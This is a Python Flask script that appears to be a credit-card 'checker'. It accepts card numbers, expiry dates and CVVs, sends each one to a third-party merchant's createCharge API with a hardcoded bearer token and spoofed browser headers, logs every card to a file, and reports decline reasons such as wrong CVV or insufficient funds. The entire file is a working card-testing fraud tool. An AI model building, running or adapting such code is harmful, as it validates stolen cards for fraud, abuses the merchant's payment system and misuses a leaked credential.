from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

API_URL = "https://api.theaccessbox.com/api/v1/UserAccount/createCharge"
ZIP_CODE = "10001"  # Constant zip code
BEARER_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2FwaS50aGVhY2Nlc3Nib3guY29tL2FwaS92MS9sb2dpbiIsImlhdCI6MTcxODg2NjUyMCwibmJmIjoxNzE4ODY2NTIwLCJqdGkiOiJrWE83ZWJxMnhwMzQ1QWhYIiwic3ViIjoiNzEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.sARiJkMVJDq4PMYKPFH9nbSxfBJ5lJMLXRzbBByfiFQ"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json, text/plain, */*",
  'Content-Type': "application/json",
  'origin': "https://theaccessbox.com",
  'referer': "https://theaccessbox.com/",
  'authorization': f"Bearer {BEARER_TOKEN}"
}

# Mapping dictionary for API response messages
response_messages = {
    "success": "Payment successful.",
    "Your card does not support this type of purchase.": "Card does not support this type of purchase.",
    "Your card was declined.": "Card declined.",
    "Invalid account.": "Invalid account.",
    "Your card's security code is incorrect.": "Incorrect security code.",
    "Your card has insufficient funds.": "Insufficient funds.",
    "An error occurred while processing your card.": "Error processing card.",
    "Your card's expiration year is invalid.": "Invalid expiration year.",
    "Your card's expiration month is invalid.": "Invalid expiration month.",
    "Your card's zip code failed validation.": "Invalid zip code.",
    "Your card's security code is required.": "Security code is required.",
    "Your card's zip code is incorrect.": "Incorrect zip code.",
    "Your bank declined this payment.": "Bank declined payment.",
    "Your card was declined for an unknown reason.": "Card declined for unknown reason.",
    "Your card was declined by your bank.": "Card declined by bank.",
    "Your card was declined because it has expired.": "Card expired."
}

@app.route('/HRK', methods=['GET'])
def process_request():
    api_key = request.args.get('API')
    cc_info = request.args.get('CC')
    
    if api_key != "SK_LIVE_NHI_HAI_SIR":
        return jsonify({"error": "Invalid API key"}), 403
    
    if not cc_info:
        return jsonify({"error": "Missing CC information"}), 400
    
    try:
        card_number, expiry_month, expiry_year, cvv = cc_info.split("|")
    except ValueError:
        return jsonify({"error": "Invalid CC format. Expected format: number|MM|YYYY|CVV"}), 400
    
    payload = {
        "number": card_number,
        "expiry_date": f"{expiry_month}/{expiry_year}",
        "cvv": cvv,
        "zip_code": ZIP_CODE
    }
    
    response = requests.post(API_URL, json=payload, headers=headers)
    
    # Log response to a file
    with open('resp.txt', 'a') as resp_file:
        resp_file.write(f"Card Information Used: {cc_info}\n")
        resp_file.write(f"Response: {response.text}\n")
        resp_file.write("-" * 50 + "\n")
    
    # Extract response message from JSON
    response_json = response.json()
    if "message" in response_json:
        response_message = response_json["message"]
    elif "error" in response_json:
        response_message = response_json["error"]
    else:
        response_message = "Unknown response"
    
    # Map API response to user-friendly message
    if response_message in response_messages:
        user_message = response_messages[response_message]
    else:
        user_message = response_message  # Use original message if no mapping
    
    return jsonify({
        "card_info": cc_info,
        "response": user_message
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
